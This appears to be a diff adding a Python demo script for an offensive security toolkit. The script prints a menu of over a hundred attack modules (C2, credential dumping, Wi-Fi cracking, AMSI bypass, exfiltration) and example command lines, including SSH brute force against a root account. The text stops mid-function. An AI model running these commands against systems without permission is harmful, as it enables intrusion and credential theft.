@@ -1,0 +1,1708 @@
+#!/usr/bin/env python3
+"""
+Cerberus Agents v3.0 - Production Security Toolkit Demo
+Enterprise-grade penetration testing framework with REAL integrations
+"""
+
+import sys
+import logging
+from pathlib import Path
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+
+def print_banner():
+    banner = """
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║   ██████╗███████╗██████╗ ██████╗ ███████╗██████╗ ██╗   ██╗ ║
+║  ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║   ██║ ║
+║  ██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝██║   ██║ ║
+║  ██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██║   ██║ ║
+║  ╚██████╗███████╗██║  ██║██████╔╝███████╗██║  ██║╚██████╔╝ ║
+║   ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝  ║
+║                                                              ║
+║     Enterprise Security Toolkit v15.0 - 2025 EDITION        ║
+║   Production-Ready | 128 Advanced Penetration Test Modules  ║
+║  C2 | Cloud | OSINT | AI | WiFi | iOS | macOS | AD | Mobile ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+    print(banner)
+    print("\n⚠️  AUTHORIZATION REQUIRED: This toolkit must only be used with")
+    print("   explicit written authorization from the target owner.")
+    print("\n✅ PRODUCTION FEATURES (v3.0):")
+    print("   • Real nmap, LDAP, SQL/NoSQL, AWS, Scapy, JWT integrations")
+    print("   • OSINT reconnaissance with Shodan API integration")
+    print("   • Protocol security (SMB, FTP, SSH, RDP, SMTP)")
+    print("   • Advanced password cracking with Hydra/paramiko")
+    print("\n🔥 CUTTING-EDGE RED TEAM TOOLS (v8.0 - 2025):")
+    print("   • Sliver C2: Nation-state C2 framework (Go-based)")
+    print("   • Mythic C2: Modular C2 with operator analytics")
+    print("   • Pacu: AWS exploitation & privilege escalation")
+    print("   • Prowler: Multi-cloud compliance (AWS/Azure/GCP)")
+    print("   • SpiderFoot: 200+ OSINT modules automation")
+    print("   • Empire: Multi-language post-exploitation C2")
+    print("   • OWASP ZAP: Industry-standard web scanner")
+    print("   • reconFTW: Automated recon workflow")
+    print("   • Rclone: Covert data exfiltration via cloud")
+    print("   • DNS Tunneling: DNScat2/Iodine C2 bypass")
+    print("   • GhostPack: Rubeus/Seatbelt/Certify suite")
+    print("   • PoshC2: Python3 C2 with AMSI bypass")
+    print("\n⚡ 2025 ULTRA-MODERN TOOLS (v9.0 - October 29, 2025):")
+    print("   • RustScan: Scan 65K ports in 3 seconds (100x faster)")
+    print("   • Ffuf: Fast web fuzzer (dirs, params, vhosts)")
+    print("   • Feroxbuster: Recursive content discovery (Rust)")
+    print("   • Ligolo-ng: TUN-based pivoting (no proxychains)")
+    print("   • Kerbrute: AD user enum without lockouts")
+    print("   • enum4linux-ng: Modern SMB/LDAP enumeration")
+    print("   • CloudFox: AWS attack path analysis")
+    print("   • Caldera: MITRE ATT&CK adversary emulation")
+    print("   • Ghidra: NSA reverse engineering framework\n")
+
+
+def demo_menu():
+    """Display enterprise security testing menu - ORGANIZED BY CATEGORY"""
+    print("\n" + "=" * 80)
+    print("🔐 CERBERUS AGENTS v15.0 - PRODUCTION SECURITY TOOLKIT (128 Modules)")
+    print("=" * 80)
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🔍 RECONNAISSANCE & OSINT                                           ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("1.  🔎 OSINT & Reconnaissance • Email • DNS • Shodan")
+    print("22. 🔍 Advanced Subdomain Enumeration • DNS • Zone transfers")
+    print("23. 🕵️  Advanced OSINT • Social media • Breach data")
+    print("43. 📱 Phone & Email OSINT • Holehe • Sherlock • Maigret")
+    print("44. 👤 Facial Recognition • DeepFace • Age detection")
+    print("45. 📹 CCTV Discovery • Shodan • ONVIF • RTSP")
+    print("46. 🔒 Camera Pentesting • Default creds • CVE scan")
+    print("47. 🤖 AI Image Intelligence • EXIF • Gemini • Geolocation")
+    print("55. 🕷️  SpiderFoot • 200+ OSINT modules • Dark web")
+    print("58. 🎯 reconFTW • Automated recon • Screenshots")
+    print("80. 🔎 Subfinder • Subdomain discovery • ProjectDiscovery")
+    print("111. 🔍 theHarvester • 50+ sources • Email harvesting")
+    print("112. 📄 Metagoofil • Document metadata • MAC addresses")
+    print("113. 🎯 Sn1per • 100+ tools • Full pentest automation")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🌐 NETWORK & INFRASTRUCTURE                                         ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("2.  🔍 Network Scanner • nmap • OS fingerprinting")
+    print("3.  🔐 Protocol Security • SMB • FTP • SSH • RDP • SMTP")
+    print("26. 🐛 Vulnerability Scanner • CVE database • Nuclei")
+    print("27. 🔀 Network Pivoting • SSH • SOCKS • Chisel")
+    print("33. 📡 Network MITM • ARP spoof • DNS spoof")
+    print("63. 🚀 RustScan • 65K ports in 3s • 100x faster")
+    print("66. 🌐 Ligolo-ng • TUN tunneling • No proxychains")
+    print("72. 🔀 Chisel • HTTP/HTTPS tunneling • SOCKS proxy")
+    print("81. 🚀 Naabu • Ultra-fast port scan • ProjectDiscovery")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  📡 WIRELESS SECURITY (WiFi/BLE)                                     ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("11. 📡 Wireless Security • WPA/WPA2 • Deauth • Evil twin")
+    print("102. 📡 Bettercap • WiFi recon • ARP/DNS spoofing • BLE")
+    print("103. 🔓 Aircrack-ng Suite • WEP/WPA/WPA2 cracking")
+    print("104. ⚡ Wifite2 • Automated WiFi audit • WPS/PMKID")
+    print("122. 🔐 WPA3 Cracker • Wacker method • Dragonblood")
+    print("123. 🌐 Airgeddon • Evil Twin • WPS • Captive portal")
+    print("124. 🍍 WiFi Pineapple • Rogue AP • MitM • PineAP")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🌍 WEB APPLICATION SECURITY                                         ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("4.  🌐 Web Vuln Scanner • SQLi • XSS • LFI")
+    print("5.  🖥️  Web Server Scanner • Nikto-style • Headers")
+    print("6.  🔌 API Security • JWT attacks • GraphQL • Rate limit")
+    print("7.  🔒 SSL/TLS Scanner • Protocols • Ciphers • Certs")
+    print("21. 💉 SQLMap • Automated SQLi • DB dumping")
+    print("57. 🔍 OWASP ZAP • Industry standard • API testing")
+    print("64. ⚡ Ffuf • Fast web fuzzer • VHost • Parameters")
+    print("65. 🔍 Feroxbuster • Recursive discovery • Rust")
+    print("78. 🕷️  Katana • Web crawler • JS • ProjectDiscovery")
+    print("79. ⚡ httpx • HTTP probing • Tech detect • ProjectDiscovery")
+    print("82. 📸 GoWitness • Web screenshots • Visual recon")
+    print("83. 🌐 Wapiti • Black-box • SQLi • XSS • LFI")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  💾 DATABASE SECURITY                                                ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("8.  💾 Database Scanner • SQLi • NoSQL • Config audit")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🏢 ACTIVE DIRECTORY & WINDOWS                                       ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("9.  🏢 AD Attacks • LDAP • Kerberoasting • AS-REP")
+    print("20. 🔨 Impacket • PSExec • WMIExec • SMBExec")
+    print("25. 🎣 Network Poisoning • LLMNR • NBT-NS • Responder")
+    print("28. 🩸 BloodHound • AD attack paths • High-value targets")
+    print("29. 🎫 Kerberos Attacks • Golden/Silver tickets")
+    print("67. 🎫 Kerbrute • User enum • No lockouts • Kerberos")
+    print("68. 📁 enum4linux-ng • SMB/LDAP • RID cycling")
+    print("74. 🪟 evil-winrm • Pass-the-hash • PowerShell")
+    print("75. 💾 lsassy • Remote LSASS dumping • PTH")
+    print("76. 🔐 DonPAPI • Browser passwords • WiFi • Certs")
+    print("77. 🎯 Coercer • NTLM coercion • PrinterBug • PetitPotam")
+    print("87. 🏢 linWinPwn • 20+ AD tools • BloodHound • NetExec")
+    print("127. 🎯 NetExec • Password spray • Kerberoasting")
+    print("128. 🎫 Certipy ADCS • ESC1-13 • Template abuse • CA exploit")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  ☁️  CLOUD SECURITY (AWS/Azure/GCP)                                  ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("10. ☁️  Cloud Scanner • AWS • Azure • GCP • S3 • IAM")
+    print("24. ☁️  AWS Exploitation • S3 • Security groups • boto3")
+    print("53. ☁️  Pacu • AWS exploit • IAM privesc • Lambda")
+    print("54. 📋 Prowler • Multi-cloud • CIS • PCI-DSS • HIPAA")
+    print("69. ☁️  CloudFox • AWS attack paths • IAM • Secrets")
+    print("115. 🔵 ROADtools • Azure AD enum • Conditional Access")
+    print("116. 🔴 AADInternals • Azure exploit • PRT theft")
+    print("117. 📊 GraphRunner • M365 • Graph API • OAuth")
+    print("118. ⚡ Microburst • Azure • Storage • Key Vault")
+    print("120. ☁️  ScoutSuite • Multi-cloud audit • CIS benchmarks")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🐳 CONTAINER & KUBERNETES                                           ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("14. 🐳 Container/K8s Security • Docker • Registry")
+    print("73. 🔍 Trivy • Container images • IaC • SBOM")
+    print("84. 🐳 kube-hunter • K8s pentesting • Active/passive")
+    print("85. ⚙️  kubeletctl • Kubelet exploit • Pod exec")
+    print("86. 🎯 Peirates • K8s privesc • RBAC • Container escape")
+    print("119. 🐳 CDK • Container escape • Docker socket")
+    print("121. 🔍 deepce • Container enum • Escape vectors")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  📱 MOBILE SECURITY (iOS/Android)                                    ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("15. 📱 Mobile App Security • APK/IPA • SSL pinning")
+    print("105. 📱 iOS Pentesting • Frida • Objection • Keychain")
+    print("110. 🤖 Android Pentesting • APK analysis • ADB scan")
+    print("125. 🔓 iOS Frida Advanced • Jailbreak bypass • Hooks")
+    print("126. 🍎 macOS Red Team • Persistence • Keychain • Privesc")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🔓 PASSWORD & CREDENTIAL ATTACKS                                    ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("12. 🔓 Advanced Password Cracker • Hydra • Network brute")
+    print("13. 🔑 Hash Cracker • MD5 • SHA • bcrypt • NTLM")
+    print("30. 💾 Credential Dumping • LSASS • SAM • NTDS.dit • Browser creds")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🚀 POST-EXPLOITATION & C2 FRAMEWORKS                                ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("16. 🎯 Post-Exploitation • Privesc • Lateral • Persistence")
+    print("35. 🔓 Privilege Escalation • SUID • Sudo misconfig")
+    print("36. 📤 Data Exfiltration • DNS tunnel • ICMP • Cloud")
+    print("48. 🎯 C2 Integration • Sliver • Empire • Mythic")
+    print("51. 🚀 Sliver C2 • Go-based • mTLS • WireGuard")
+    print("52. 🎭 Mythic C2 • Modular • Apollo • Poseidon")
+    print("56. 👑 Empire C2 • PowerShell • Python • C# • 400+ modules")
+    print("59. 📤 Rclone • 40+ cloud providers • Encrypted exfil")
+    print("60. 🌐 DNS Tunneling • DNScat2 • Iodine • Firewall bypass")
+    print("61. 👻 GhostPack • Rubeus • Seatbelt • Certify")
+    print("62. 🐍 PoshC2 • Python3 • AMSI bypass • Proxy-aware")
+    print("106. 🚀 Merlin C2 • HTTP/2 • HTTP/3 QUIC • Cross-platform")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🎭 SOCIAL ENGINEERING                                               ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("17. 🎭 Social Engineering • Phishing • Pretexting")
+    print("34. 🎭 Advanced Social Eng • Credential harvester • BadUSB")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  ⚔️  ADVERSARY SIMULATION                                            ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("18. ⚔️  Adversary Emulation • MITRE ATT&CK • Purple team")
+    print("19. 📊 Detection Scoring • Blue team • SIEM testing")
+    print("70. ⚔️  MITRE Caldera • ATT&CK automation • APT simulation")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🚗 AUTOMOTIVE SECURITY                                              ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("88. 🚗 Vehicle Network Scanner • CAN/LIN/FlexRay")
+    print("89. 🔍 CAN/UDS Scanner • ISO 14229 • Diagnostics")
+    print("90. 🔬 ECU Firmware Analyzer • Binwalk • SAST")
+    print("91. 📦 OTA Update Scanner • Signature validation")
+    print("92. 📡 Telematics Backend • MQTT • gRPC • WebSocket")
+    print("93. 📶 Wireless Vehicle • BLE • WiFi • V2X")
+    print("94. 🎮 HIL Emulator • Vehicle simulators • ADAS")
+    print("95. 💉 Message Injection • CAN • Rate limiting")
+    print("96. 🔧 ECU Reflash • Bootloader • Safety checks")
+    print("97. 📱 Infotainment • Android Automotive • CarPlay")
+    print("98. 🔬 Vehicle Forensics • CAN capture • Chain of custody")
+    print("99. 🛡️  Vehicle IDS • Anomaly detection • Alerts")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🔬 REVERSE ENGINEERING & EXPLOIT DEVELOPMENT                        ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("31. 🔧 Exploit Development • ROP gadgets • Shellcode")
+    print("32. 🧪 Fuzzing Framework • Coverage-guided • Protocol")
+    print("71. 🔬 Ghidra • NSA • Decompilation • Binary analysis")
+    print("107. 🔒 Mangle • Binary obfuscation • EDR evasion")
+    print("108. 🎨 Alcatraz • x64 obfuscator • GUI-only ⚠️")
+    print("114. 💥 SharpShooter • Payload gen • AMSI bypass")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🤖 AI/LLM RED TEAMING                                               ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("109. 🤖 Garak • 100+ attack modules • Prompt injection • Jailbreak")
+    
+    print("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("┃  🛠️  UTILITIES & AUTOMATION                                          ┃")
+    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print("37. 💣 Payload Generator • Reverse shells • Web shells")
+    print("38. 📈 Report Aggregator • Findings consolidation")
+    print("39. 🍯 Tiny Canary Agent • Honeytokens • Alerting")
+    print("40. 🚨 Incident Triage • Response helper")
+    print("41. 🔁 NetExec Lateral • CrackMapExec replacement")
+    print("42. 👑 Covenant C2 • .NET • Implant generation")
+    print("49. 📚 View Documentation • User guides • Examples")
+    print("50. 🧪 Run Production Tests • Validate toolkit")
+    print("100. 🎯 Asset Discovery • Network enum • Fingerprinting")
+    print("101. 📋 Pentest Task Runner • Workflow automation")
+    
+    print("\n" + "=" * 80)
+    print("Enter module number to run, or 0 to exit")
+    print("=" * 80)
+
+
+def demo_network_scanner():
+    print("\n" + "=" * 70)
+    print("🔍 NETWORK SCANNER - REAL NMAP INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Real nmap port scanning with service detection")
+    print("   • Fallback to socket-based scanning if nmap unavailable")
+    print("   • OS fingerprinting based on TTL analysis")
+    print("   • Banner grabbing for service identification")
+    print("   • Firewall detection and analysis")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.network_scanner_advanced --target 192.168.1.0/24 --ports 1-1000 --authorized")
+    print("\nReal integrations:")
+    print("  ✓ python-nmap library for production scanning")
+    print("  ✓ Socket operations for direct TCP/UDP probing")
+    print("  ✓ Concurrent scanning with ThreadPoolExecutor")
+
+
+def demo_database_scanner():
+    print("\n" + "=" * 70)
+    print("💾 DATABASE SECURITY SCANNER - REAL DATABASE CONNECTIONS")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Real HTTP-based SQL injection testing with httpx")
+    print("   • Direct database connections: MySQL (pymysql), PostgreSQL (psycopg2)")
+    print("   • NoSQL injection testing for MongoDB")
+    print("   • Time-based blind SQL injection detection")
+    print("   • Error-based SQL injection with response analysis")
+    print("\nExample usage:")
+    print("  # HTTP-based testing")
+    print("  python -m cerberus_agents.database_security_scanner --target https://api.example.com/users --type mysql --authorized")
+    print("  # Direct connection testing")
+    print("  python -m cerberus_agents.database_security_scanner --host 192.168.1.10 --port 3306 --database testdb --authorized")
+    print("\nReal integrations:")
+    print("  ✓ pymysql for MySQL connections")
+    print("  ✓ psycopg2-binary for PostgreSQL connections")
+    print("  ✓ pymongo for MongoDB")
+    print("  ✓ httpx for async HTTP testing")
+
+
+def demo_api_scanner():
+    print("\n" + "=" * 70)
+    print("🔌 API SECURITY SCANNER - REAL JWT & HTTP TESTING")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Real JWT vulnerability testing (algorithm confusion, weak secrets)")
+    print("   • Real HTTP endpoint discovery with httpx")
+    print("   • Sensitive data exposure detection in responses")
+    print("   • Mass assignment vulnerability testing")
+    print("   • GraphQL introspection and query testing")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.api_security_scanner --target https://api.example.com --authorized")
+    print("\nReal integrations:")
+    print("  ✓ PyJWT library for real JWT manipulation")
+    print("  ✓ httpx for production HTTP requests")
+    print("  ✓ Real endpoint enumeration and testing")
+
+
+def demo_ad_attacks():
+    print("\n" + "=" * 70)
+    print("🏢 ACTIVE DIRECTORY ATTACKS - REAL LDAP INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Real LDAP enumeration with ldap3 library")
+    print("   • Domain user and computer enumeration")
+    print("   • SPN account discovery for Kerberoasting")
+    print("   • Group membership analysis")
+    print("   • Privileged account detection (adminCount attribute)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.active_directory_attacks --domain corp.local --authorized")
+    print("\nReal integrations:")
+    print("  ✓ ldap3 library for LDAP/AD operations")
+    print("  ✓ NTLM authentication support")
+    print("  ✓ Real AD object enumeration")
+
+
+def demo_cloud_scanner():
+    print("\n" + "=" * 70)
+    print("☁️  CLOUD SECURITY SCANNER - REAL AWS/AZURE/GCP")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Real AWS S3 bucket security assessment with boto3")
+    print("   • Public bucket detection and ACL analysis")
+    print("   • Encryption and versioning verification")
+    print("   • Bucket policy analysis")
+    print("   • IAM permissions audit")
+    print("\nExample usage:")
+    print("  # Requires AWS credentials in environment")
+    print("  python -m cerberus_agents.cloud_security_scanner --provider aws --authorized")
+    print("\nReal integrations:")
+    print("  ✓ boto3 library for AWS API operations")
+    print("  ✓ Real S3 bucket enumeration and policy analysis")
+    print("  ✓ CloudTrail and IAM security auditing")
+
+
+def demo_wireless():
+    print("\n" + "=" * 70)
+    print("📡 WIRELESS SECURITY - REAL SCAPY PACKET CAPTURE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Real wireless packet capture with scapy")
+    print("   • 802.11 frame analysis (Beacon, Probe, Data)")
+    print("   • WPA handshake capture")
+    print("   • Client enumeration")
+    print("   • Deauthentication attack capability")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.wireless_security --interface wlan0 --authorized")
+    print("\nReal integrations:")
+    print("  ✓ scapy library for packet manipulation")
+    print("  ✓ Real 802.11 frame capture and analysis")
+    print("  ⚠️  Requires wireless adapter in monitor mode")
+
+
+def demo_container_security():
+    print("\n" + "=" * 70)
+    print("🐳 CONTAINER/KUBERNETES SECURITY")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Docker container security audit")
+    print("   • Kubernetes cluster security assessment")
+    print("   • Container image vulnerability scanning")
+    print("   • Runtime security analysis")
+    print("   • Registry security testing")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.container_kubernetes_security --authorized")
+
+
+def demo_mobile_security():
+    print("\n" + "=" * 70)
+    print("📱 MOBILE APP SECURITY")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • APK/IPA static analysis")
+    print("   • SSL certificate pinning bypass")
+    print("   • Data leakage detection")
+    print("   • Hardcoded credentials search")
+    print("   • Reverse engineering support")
+
+
+def demo_post_exploitation():
+    print("\n" + "=" * 70)
+    print("🎯 POST-EXPLOITATION FRAMEWORK")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Privilege escalation techniques")
+    print("   • Lateral movement simulation")
+    print("   • Persistence mechanisms")
+    print("   • Data exfiltration methods")
+    print("   • Command and control (C2)")
+
+
+def demo_social_engineering():
+    print("\n" + "=" * 70)
+    print("🎭 SOCIAL ENGINEERING TOOLKIT")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Phishing email campaigns")
+    print("   • SMS/vishing frameworks")
+    print("   • Pretexting scenarios")
+    print("   • Physical security testing")
+
+
+def demo_osint():
+    print("\n" + "=" * 70)
+    print("🔎 OSINT & RECONNAISSANCE - REAL INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Email harvesting from search engines, PGP servers")
+    print("   • Subdomain enumeration via DNS brute force + crt.sh")
+    print("   • DNS record enumeration (A, AAAA, MX, NS, TXT, SOA)")
+    print("   • WHOIS lookup with detailed parsing")
+    print("   • SSL certificate information extraction")
+    print("   • Shodan integration for exposed services")
+    print("   • Technology detection (frameworks, CMS)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.osint_reconnaissance --target example.com --authorized")
+    print("\nReal integrations:")
+    print("  ✓ dnspython for DNS operations")
+    print("  ✓ requests for HTTP/HTTPS operations")
+    print("  ✓ Certificate transparency (crt.sh) API")
+    print("  ✓ Shodan API (requires API key)")
+
+def demo_protocol_scanner():
+    print("\n" + "=" * 70)
+    print("🔐 PROTOCOL SECURITY SCANNER - REAL INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • SMB/CIFS security testing (version detection, null sessions)")
+    print("   • FTP anonymous access and version detection")
+    print("   • SSH version detection and algorithm testing")
+    print("   • RDP security assessment")
+    print("   • SMTP enumeration and relay testing")
+    print("   • Telnet detection (insecure protocol)")
+    print("   • SNMP community string enumeration")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.protocol_security_scanner --target 192.168.1.10 --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Socket operations for protocol testing")
+    print("  ✓ smbclient integration (if available)")
+    print("  ✓ Real network protocol analysis")
+
+def demo_password_cracker():
+    print("\n" + "=" * 70)
+    print("🔓 ADVANCED PASSWORD CRACKER - REAL HYDRA INTEGRATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Hash cracking (MD5, SHA1, SHA256, SHA512, bcrypt, NTLM)")
+    print("   • Network service brute forcing (SSH, FTP, SMB, RDP)")
+    print("   • Hydra integration for advanced attacks")
+    print("   • Dictionary attacks with wordlist support")
+    print("   • Password mutation and hybrid attacks")
+    print("\nExample usage:")
+    print("  # Hash cracking")
+    print("  python -m cerberus_agents.advanced_password_cracker --hash 5f4dcc3b5aa765d61d8327deb882cf99 --type md5 --common-passwords --authorized")
+    print("  # Network brute force")
+    print("  python -m cerberus_agents.advanced_password_cracker --target 192.168.1.10 --service ssh --username root --common-passwords --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Hydra for network attacks")
+    print("  ✓ paramiko for SSH brute force")
+    print("  ✓ ftplib for FTP attacks")
+
+def demo_ssl_scanner():
+    print("\n" + "=" * 70)
+    print("🔒 SSL/TLS SECURITY SCANNER")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • SSL/TLS protocol version detection (SSLv2, SSLv3, TLS 1.0-1.3)")
+    print("   • Cipher suite enumeration")
+    print("   • Certificate validation and chain analysis")
+    print("   • Vulnerability detection (Heartbleed, POODLE, BEAST)")
+    print("   • Certificate expiration checking")
+    print("   • Weak cipher detection")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.ssl_tls_scanner --target example.com --authorized")
+    print("\nReal integrations:")
+    print("  ✓ Python ssl library for protocol testing")
+    print("  ✓ Certificate parsing and validation")
+
+def demo_web_server_scanner():
+    print("\n" + "=" * 70)
+    print("🖥️  WEB SERVER SCANNER - NIKTO-STYLE")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Server version detection and disclosure")
+    print("   • Security header analysis (HSTS, CSP, X-Frame-Options)")
+    print("   • HTTP method testing (PUT, DELETE, TRACE)")
+    print("   • Sensitive file/directory enumeration")
+    print("   • WAF detection")
+    print("   • SSL redirect verification")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.web_server_scanner --target https://example.com --authorized")
+    print("\nReal integrations:")
+    print("  ✓ requests library for HTTP operations")
+    print("  ✓ Real vulnerability detection")
+
+def demo_phone_email_osint():
+    print("\n" + "=" * 70)
+    print("📱 ADVANCED PHONE & EMAIL OSINT")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Phone number carrier and geolocation lookup")
+    print("   • Email validation and platform registration checking (Holehe)")
+    print("   • Username search across 400+ sites (Sherlock)")
+    print("   • Deep investigation across 3000+ sites (Maigret)")
+    print("   • Breach database integration")
+    print("   • Domain email harvesting (theHarvester)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.advanced_osint_phone_email --email target@example.com --authorized")
+    print("  python -m cerberus_agents.advanced_osint_phone_email --phone +1234567890 --authorized")
+    print("  python -m cerberus_agents.advanced_osint_phone_email --username john_doe --deep --authorized")
+    print("\nReal integrations:")
+    print("  ✓ phonenumbers library for carrier lookup")
